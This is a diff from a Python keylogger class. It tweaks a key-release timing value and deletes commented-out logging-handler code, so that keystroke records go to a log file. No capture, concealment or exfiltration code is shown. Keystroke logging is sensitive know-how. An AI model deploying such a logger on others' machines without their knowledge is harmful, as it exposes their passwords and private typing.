@@ -22,34 +22,16 @@ class KeyLogger:
     def __init__(self, log_file='KeyloggerOutput.log') -> None:
         self.log_file = log_file
         self.last_event = None
-        self.release_hold = 0.15
+        self.release_hold = 0.125
         self.configure_logger()
 
     # Method to configure the logger we want
     def configure_logger(self) -> None:
-        # # Remove the default StreamHandler from the root logger so there is no output to the console 
-        # # and only outputs to the file
-        # root_logger = logging.getLogger()
-        # if root_logger.handlers:
-        #     root_logger.handlers.clear()
-
         # Configure the root logger to the INFO level and set the format
         logging.basicConfig(filename=self.log_file, level=logging.INFO, format='%(levelname)s - %(message)s')
 
         # Create the logger 
         self.logger = logging.getLogger('keystroke_logger')
-
-        # # Create the FileHandler that will write the log messages to a file
-        # # Set the log level of the FileHandler
-        # self.fileHandler = logging.FileHandler(self.log_file)
-        # self.fileHandler.setLevel(logging.INFO)
-
-        # # Create the format for the output file log 
-        # logOutFormat = logging.Formatter('%(levelname)s - %(message)s')
-        # self.fileHandler.setFormatter(logOutFormat)
-
-        # # Add the FileHandler to the logger 
-        # self.logger.addHandler(self.fileHandler)
 
     # Method to get the timestamp with the desired format for output file
     @staticmethod
